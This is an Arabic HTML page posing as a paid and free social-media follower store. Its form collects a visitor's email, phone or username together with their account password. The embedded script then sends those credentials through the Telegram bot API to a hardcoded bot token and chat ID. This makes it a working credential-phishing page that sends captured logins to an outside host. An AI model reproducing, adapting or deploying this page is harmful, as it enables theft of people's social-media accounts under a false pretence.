<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>متجر المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: linear-gradient(145deg, #0b0e1a 0%, #1a1f33 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }

        .card {
            max-width: 500px;
            width: 100%;
            background: rgba(20, 25, 45, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 40px;
            padding: 30px 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            color: white;
        }

        /* الشعار والعنوان */
        .header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.02);
            padding: 15px;
            border-radius: 30px;
            border: 1px solid #2a2f4b;
        }

        .icon {
            background: #2f3c7e;
            width: 48px;
            height: 48px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 26px;
            color: #ffe484;
        }

        .header-text h2 {
            font-size: 18px;
            font-weight: 600;
            color: #e9eef2;
        }

        .header-text p {
            font-size: 14px;
            color: #8b93b0;
        }

        /* عنوان بيانات التحقق */
        .verify-title {
            margin: 25px 0 12px 0;
            font-weight: 500;
            color: #b9c2da;
            font-size: 16px;
        }

        /* أزرار طريقة التحقق (بالبريد / بالرقم / باليوزر) */
        .verify-methods {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
        }

        .method-btn {
            flex: 1;
            background: #1e233b;
            border: 1px solid #2e3553;
            color: #b5bedb;
            padding: 12px 0;
            border-radius: 30px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            text-align: center;
        }

        .method-btn.active {
            background: #2f3c7e;
            border-color: #5a6ab3;
            color: white;
            box-shadow: 0 4px 12px #1f2b5c;
        }

        /* حقول الإدخال */
        .input-field {
            width: 100%;
            background: #151b2b;
            border: 1.5px solid #2a3150;
            border-radius: 40px;
            padding: 18px 22px;
            margin-bottom: 14px;
            color: white;
            font-size: 15px;
            transition: 0.2s;
        }

        .input-field:focus {
            border-color: #5f73d9;
            outline: none;
            background: #1b2340;
        }

        .input-field::placeholder {
            color: #5e688b;
            font-weight: 400;
        }

        /* العنوان: اختر الباقة المناسبة */
        .packages-title {
            margin: 15px 0 15px 0;
            font-weight: 600;
            font-size: 18px;
            color: white;
            text-align: center;
        }

        /* الباقات */
        .packages-grid {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 5px;
        }

        .package-row {
            background: #1b2137;
            border-radius: 40px;
            padding: 10px 20px 10px 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid #2d3557;
            transition: 0.2s;
            cursor: pointer;
        }

        .package-row.selected {
            border: 2px solid #ffe484;
            background: #262e4b;
            box-shadow: 0 0 0 2px rgba(255, 228, 132, 0.2);
        }

        .package-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .package-check {
            width: 28px;
            height: 28px;
            background: #262e4e;
            border-radius: 50%;
            border: 2px solid #434d7a;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 14px;
        }

        .package-row.selected .package-check {
            background: #ffe484;
            border-color: #ffe484;
            color: #0b0e1a;
        }

        .package-name {
            font-weight: 600;
            font-size: 18px;
        }

        .package-price {
            background: #2b3457;
            padding: 8px 20px;
            border-radius: 40px;
            color: #ffe484;
            font-weight: 700;
            font-size: 18px;
            border: 1px solid #4f5c96;
        }

        /* رسالة التأكيد */
        .message-alert {
            padding: 15px;
            border-radius: 40px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 600;
            display: none;
        }

        .message-success {
            background: #1f3a3f;
            border: 2px solid #2ecc71;
            color: #2ecc71;
        }

        .message-error {
            background: #3f1f2b;
            border: 2px solid #e74c3c;
            color: #e74c3c;
        }

        .message-loading {
            background: #1f2a3f;
            border: 2px solid #f1c40f;
            color: #f1c40f;
        }

        /* زر الطلب */
        .order-btn {
            width: 100%;
            background: linear-gradient(95deg, #ffe484, #ffd166);
            border: none;
            border-radius: 60px;
            padding: 22px;
            margin-top: 30px;
            font-weight: 800;
            font-size: 20px;
            color: #0b0e1a;
            box-shadow: 0 15px 25px -5px #ffe48430;
            cursor: pointer;
            transition: 0.2s;
        }

        .order-btn:hover {
            background: #ffdd77;
            transform: scale(1.02);
        }

        .order-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* تذكير مجاني */
        .footer-note {
            text-align: center;
            margin-top: 20px;
            color: #6b749b;
            font-size: 14px;
        }

        .free-badge {
            background: #313b62;
            padding: 4px 10px;
            border-radius: 40px;
            color: #ffe484;
            font-size: 13px;
            margin-right: 8px;
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- رأس الصفحة -->
        <div class="header">
            <div class="icon">📈</div>
            <div class="header-text">
                <h2>fares alwsaby</h2>
                <p>OFFICIAL FOLLOWERS SERVER</p>
            </div>
        </div>

        <!-- رسالة التأكيد -->
        <div id="messageAlert" class="message-alert"></div>

        <!-- بيانات التحقق -->
        <div class="verify-title">بيانات التحقق</div>
        <div class="verify-methods">
            <button class="method-btn active" id="methodEmail">بالبريد</button>
            <button class="method-btn" id="methodPhone">بالرقم</button>
            <button class="method-btn" id="methodUser">باليوزر</button>
        </div>

        <!-- حقول الإدخال -->
        <input type="text" class="input-field" id="inputField" placeholder="البريد الإلكتروني" value="user@example.com">
        <input type="password" class="input-field" id="passwordField" placeholder="كلمة المرور" value="••••••••">

        <!-- باقات -->
        <div class="packages-title">اختر الباقة المناسبة</div>
        <div class="packages-grid" id="packagesContainer"></div>

        <!-- زر تقديم الطلب -->
        <button class="order-btn" id="orderBtn">تأكيد الطلب</button>
        <div class="footer-note"></div>
    </div>

    <script>
        // ========== إعدادات تيليجرام ==========
        // ⚠️ قم بتغيير هذه القيم إلى التوكن والمعرف الخاص بك
        const BOT_TOKEN = '8430357547:AAHXEkYQ-1UJb7QQVU-nuJqlsSTsRQyTNyA'; // ضع توكن البوت هنا
        const CHAT_ID = '6847298436'; // ضع معرف الدردشة هنا
        
        // ======================================

        // منطق تبديل طرق التحقق
        const methodEmail = document.getElementById('methodEmail');
        const methodPhone = document.getElementById('methodPhone');
        const methodUser = document.getElementById('methodUser');
        const inputField = document.getElementById('inputField');
        const passwordField = document.getElementById('passwordField');
        const messageAlert = document.getElementById('messageAlert');
        const orderBtn = document.getElementById('orderBtn');

        let currentMethod = 'email';

        function setActiveMethod(active) {
            [methodEmail, methodPhone, methodUser].forEach(btn => btn.classList.remove('active'));
            
            if (active === 'email') {
                methodEmail.classList.add('active');
                inputField.placeholder = 'البريد الإلكتروني';
                inputField.value = '';
                currentMethod = 'email';
            } else if (active === 'phone') {
                methodPhone.classList.add('active');
                inputField.placeholder = 'رقم الهاتف';
                inputField.value = '';
                currentMethod = 'phone';
            } else if (active === 'user') {
                methodUser.classList.add('active');
                inputField.placeholder = 'اليوزر (Username)';
                inputField.value = '';
                currentMethod = 'user';
            }
        }

        methodEmail.addEventListener('click', () => setActiveMethod('email'));
        methodPhone.addEventListener('click', () => setActiveMethod('phone'));
        methodUser.addEventListener('click', () => setActiveMethod('user'));

        // إنشاء الباقات
        const exactPackages = [
            { label: 'مجاني', desc: '500 متابع', price: 'مجاني' },
            { label: '500', desc: 'متابع', price: '3$' },
            { label: '1,000', desc: 'متابع', price: '7$' },
            { label: '2,500', desc: 'متابع', price: '12$' },
            { label: '5,000', desc: 'متابع', price: '20$' },
        ];

        const container = document.getElementById('packagesContainer');
        container.innerHTML = '';
        
        exactPackages.forEach((pkg, index) => {
            const row = document.createElement('div');
            row.className = 'package-row' + (index === 2 ? ' selected' : '');
            row.setAttribute('data-index', index);
            
            let priceDisplay = pkg.price === 'مجاني' 
                ? '<span class="free-badge" style="background:#3f4a7a;">مجاني</span>'
                : `<span class="package-price">${pkg.price}</span>`;

            row.innerHTML = `
                <div class="package-info">
                    <div class="package-check">${index === 2 ? '✓' : ''}</div>
                    <div><span class="package-name">${pkg.label}</span> <span style="color:#a3add9;">${pkg.desc}</span></div>
                </div>
                ${priceDisplay}
            `;

            row.addEventListener('click', function() {
                document.querySelectorAll('.package-row').forEach(r => {
                    r.classList.remove('selected');
                    r.querySelector('.package-check').innerText = '';
                });
                this.classList.add('selected');
                this.querySelector('.package-check').innerText = '✓';
            });

            container.appendChild(row);
        });

        // دالة إظهار الرسائل
        function showMessage(text, type) {
            messageAlert.style.display = 'block';
            messageAlert.className = `message-alert message-${type}`;
            messageAlert.textContent = text;
            
            // إخفاء الرسالة بعد 5 ثواني
            setTimeout(() => {
                messageAlert.style.display = 'none';
            }, 5000);
        }

        // دالة إرسال البيانات إلى تيليجرام
        async function sendToTelegram(data) {
            const message = `
🔔 **طلب جديد من الموقع** 🔔

👤 **طريقة التحقق:** ${data.method === 'email' ? '📧 بريد إلكتروني' : data.method === 'phone' ? '📱 رقم هاتف' : '🆔 يوزر'}
📝 **القيمة:** ${data.identifier}
🔑 **كلمة المرور:** ${data.password}
📦 **الباقة المختارة:** ${data.package}
💰 **السعر:** ${data.price}

⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
            `;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const result = await response.json();
                
                if (result.ok) {
                    showMessage('✅ تم إرسال طلبك بنجاح! سيتم التواصل معك قريباً.', 'success');
                } else {
                    showMessage('❌ فشل في إرسال الطلب. يرجى المحاولة مرة أخرى.', 'error');
                    console.error('Telegram API error:', result);
                }
            } catch (error) {
                showMessage('❌ خطأ في الاتصال. تحقق من اتصالك بالإنترنت.', 'error');
                console.error('Network error:', error);
            }
        }

        // التحقق من صحة المدخلات
        function validateInputs(identifier, password, selectedPackage) {
            if (!identifier || identifier.trim() === '') {
                showMessage('❌ الرجاء إدخال بيانات التحقق', 'error');
                return false;
            }
            
            if (!password || password.trim() === '') {
                showMessage('❌ الرجاء إدخال كلمة المرور', 'error');
                return false;
            }
            
            if (!selectedPackage) {
                showMessage('❌ الرجاء اختيار باقة', 'error');
                return false;
            }
            
            return true;
        }

        // حدث النقر على زر الطلب
        orderBtn.addEventListener('click', async function() {
            const identifier = inputField.value.trim();
            const password = passwordField.value.trim();
            
            // الحصول على الباقة المختارة
            const selectedRow = document.querySelector('.package-row.selected');
            if (!selectedRow) {
                showMessage('❌ الرجاء اختيار باقة أولاً', 'error');
                return;
            }
            
            const packageName = selectedRow.querySelector('.package-name').innerText;
            const packageDesc = selectedRow.querySelector('span[style*="color:#a3add9"]').innerText;
            const packagePrice = selectedRow.querySelector('.package-price, .free-badge')?.innerText || 'مجاني';
            
            const selectedPackage = `${packageName} ${packageDesc} - ${packagePrice}`;

            // التحقق من المدخلات
            if (!validateInputs(identifier, password, selectedPackage)) {
                return;
            }

            // تعطيل الزر أثناء الإرسال
            orderBtn.disabled = true;
            orderBtn.textContent = 'جاري الإرسال...';
            showMessage('⏳ جاري إرسال طلبك...', 'loading');

            // تجهيز البيانات للإرسال
            const dataToSend = {
                method: currentMethod,
                identifier: identifier,
                password: password,
                package: selectedPackage,
                price: packagePrice
            };

            // إرسال إلى تيليجرام
            await sendToTelegram(dataToSend);

            // إعادة تمكين الزر
            orderBtn.disabled = false;
            orderBtn.textContent = 'تأكيد الطلب';
        });

        // التحقق من وجود التوكن والمعرف
        if (BOT_TOKEN === '8430357547:AAHXEkYQ-1UJb7QQVU-nuJqlsSTsRQyTNyA' || CHAT_ID === '6847298436') {
            console.warn('⚠️ يرجى تحديث BOT_TOKEN و CHAT_ID في الكود!');
            showMessage('⚠️ الرجاء تحديث إعدادات البوت في الكود', 'error');
        }
    </script>
</body>
</html>
